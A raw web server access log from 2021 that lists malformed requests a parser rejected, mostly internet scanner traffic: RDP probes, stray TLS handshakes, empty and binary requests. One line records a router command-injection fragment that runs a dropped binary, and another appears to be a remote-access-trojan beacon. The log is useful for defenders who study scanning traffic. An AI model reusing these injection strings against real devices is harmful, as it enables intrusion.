7@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5204@@185.142.236.40 - - [23/Nov/2021:20:46:47 +0000] "\x033S\x9Da\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
5300@@103.153.76.212 - - [23/Nov/2021:22:16:36 +0000] "" 400 0 "-" "-"@@list index out of range
5425@@94.232.43.63 - - [22/Nov/2021:02:54:45 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5426@@94.232.43.63 - - [22/Nov/2021:02:54:45 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5434@@185.254.31.134 - - [22/Nov/2021:03:32:05 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03XH\xA2\xE3\x12\xB4B\x98\x0B\xCF\xA6\xC4)\xE7\xB6\xCC:^\x06\x8A\xA4\xADaQ\xDC\xE0s\x94\xF8\x8E#\x08 \xE8\x17\xD2<\x1C\xAA\xC8\xA6\xADD\xC5m\xD8\xA6pe\x83n\x8FW\x07\x90\x98Q\xA45z\xD5\x9E\xF7\xD5\x16\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 166 "-" "-"@@list index out of range
5507@@178.128.194.144 - - [22/Nov/2021:06:24:39 +0000] "\x00\xFFK\x00\x00\x00\xE2\x00 \x00\x00\x00\x0E2O\xAAC\xE92g\xC2W'\x17+\x1D\xD9\xC1\xF3,kN\x17\x14" 400 166 "-" "-"@@list index out of range
5508@@178.128.194.144 - - [22/Nov/2021:06:24:39 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
5565@@94.232.43.63 - - [22/Nov/2021:08:05:27 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5566@@94.232.43.63 - - [22/Nov/2021:08:05:27 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5572@@205.185.124.100 - - [22/Nov/2021:08:47:07 +0000] "" 400 0 "-" "-"@@list index out of range
5668@@193.46.254.155 - - [22/Nov/2021:10:46:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA8\xA8L\xCCd\x15\x1Cx\xA2\x98!\x7F\x8A\xE8\x8C\xC7\x1AE\x05\xF3\x8EC\x1C\xFA-\xEB\xFEd\xA5evg\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
5963@@20.55.53.144 - - [22/Nov/2021:21:25:24 +0000] "\xA6\xE4Hb\xB5\x81\xC4t\xC1\x8CfR\x9B\xF3\x12\x1B\x97\x1B\x10Z\xD3" 400 166 "-" "-"@@list index out of range
5992@@94.232.43.63 - - [22/Nov/2021:22:08:16 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5993@@94.232.43.63 - - [22/Nov/2021:22:08:16 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
6020@@139.162.145.250 - - [22/Nov/2021:23:11:38 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03B=\x85\xDE\xF6\xC5H\x98\xCF\x13\xA9b=\xE7\x1D\xEA\x94\x16\xD4z6\xA4jqG\xEF/\xA9:\xD5\xB6\x19\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
6095@@120.212.134.153 - - [03/Apr/2021:05:22:13 +0000] "0;sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
6239@@87.251.70.87 - - [03/Apr/2021:13:52:08 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=eltons" 400 166 "-" "-"@@list index out of range
7322@@159.89.103.83 - - [03/Apr/2021:15:56:35 +0000] "" 400 0 "-" "-"@@list index out of range
7402@@66.240.205.34 - - [03/Apr/2021:22:35:56 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"@@list index out of range
7678@@172.104.131.24 - - [20/Nov/2021:05:36:39 +0000] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 166 "-" "-"@@list index out of range
7680@@157.230.143.29 - - [20/Nov/2021:05:39:16 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
7683@@45.137.21.9 - - [20/Nov/2021:06:19:21 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03C\xC1cH\xF8\xC6\xF3\x01\x92\xAF3\xD7\x8A\xC0\x0F:}^\xBC_[\x1FOw\x18\x13~w\xA4h!\x91 q\x1B\xBF\x83\xA8\x5C\xE3F'5B\xD8" 400 166 "-" "-"@@list index out of range
7790@@45.137.21.9 - - [20/Nov/2021:11:47:58 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xBE\x0ER\xC3(@\xFE\xAD\x8C\x89\xD0\x84\x16\xCC\xB2B\xBF\xB9\x84\xBB\xEE\xD6;P\xEA\x14X\xF2\x8A\xEB\xFDn \xCF72\xB7\xBBqh\xC9z4^\xE3\xA2\x9B\x95\xD5\xF4\x95\xC6\x1F\x04\x1C\xEC\xF3KF\xF6?\xACjv\xA3\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"@@list index out of range
7831@@80.82.77.139 - - [20/Nov/2021:12:57:10 +0000] "" 400 0 "-" "-"@@list index out of range
7832@@80.82.77.139 - - [20/Nov/2021:12:57:10 +0000] "" 400 0 "-" "-"@@list index out of range
7833@@80.82.77.139 - - [20/Nov/2021:12:57:10 +0000] "" 400 0 "-" "-"@@list index out of range
